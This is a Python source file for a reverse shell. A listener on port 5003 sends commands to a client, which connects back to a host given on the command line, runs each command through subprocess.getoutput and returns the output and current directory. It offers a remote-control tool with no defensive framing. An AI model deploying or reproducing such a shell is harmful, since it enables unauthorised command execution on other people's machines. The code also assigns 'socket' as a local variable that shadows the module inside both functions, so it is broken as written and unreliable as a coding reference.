import socket
import os
import subprocess
import sys

SERVER_HOST = "0.0.0.0"
CLIENT_SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

def reverse_shell_server():
    socket = socket.socket()
    socket.bind((SERVER_HOST, SERVER_PORT))
    socket.listen(10)
    print(f"Listening on {SERVER_HOST}:{SERVER_PORT}")

    client_socket, client_address = socket.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")

    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("Current working directory:", cwd)

    while True:
        command = input(f"{cwd}")
        if not command.strip():
            continue
        client_socket.send(command.encode())
        if command.lower() == 'exit':
            break
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)

def reverse_shell_client():
    socket = socket.socket()
    socket.connect((CLIENT_SERVER_HOST, SERVER_PORT))
    cwd = os.getcwd()
    socket.send(cwd.encode())

    while True:
        # receive the command from the server
        command = socket.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        socket.send(message.encode())
    # close client connection
    socket.close()